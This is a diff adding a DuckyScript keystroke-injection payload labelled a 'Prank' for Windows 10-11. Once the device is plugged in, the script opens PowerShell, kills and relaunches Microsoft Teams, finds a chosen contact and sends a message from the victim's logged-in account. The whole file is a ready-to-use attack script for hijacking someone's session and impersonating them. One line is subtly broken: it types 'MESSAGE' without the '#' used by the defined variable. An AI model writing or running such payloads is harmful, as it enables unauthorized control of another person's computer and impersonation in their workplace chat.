@@ -1,0 +1,49 @@
+REM ###########################################
+REM #                                         |
+REM # Title        : Send Messages In Teams   |
+REM # Author       : Aleff                    |
+REM # Version      : 1.0                      |
+REM # Category     : Prank                    |
+REM # Target       : Windows 10-11            |
+REM #                                         |
+REM ###########################################
+
+REM Requirements:
+REM     - Microsoft Teams installed and user logged-in
+REM     - Internet Connection
+REM     - ExecutionPolicy Bypass
+REM     - Python
+
+REM 1. Open a powershell
+REM 2. Close if Teams is opens and reopen it
+REM 3. Goto search bar
+REM 4. Search the person by name, email, id or what you want...
+REM 5. Downarrow and enter to open the chat
+
+REM REQUIRED - Name, email, id or what you want for contact the target
+DEFINE #USER example
+
+REM REQUIRED - Messages
+DEFINE #MESSAGE example
+
+DEFAULT_DELAY 1000
+GUI r
+STRINGLN powershell
+
+REM #### Powershell ####
+STRINGLN Stop-Process -Name "Teams"
+STRINGLN Start-Process "$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Microsoft Teams (work or school)"
+
+REM It depends by the computer power
+DELAY 10000
+
+REM #### Teams ####
+CTRL N
+STRINGLN #USER
+REPEAT 2 TAB
+
+REM #### Messages ####
+STRINGLN MESSAGE
+
+ALT F4
+ALT F4
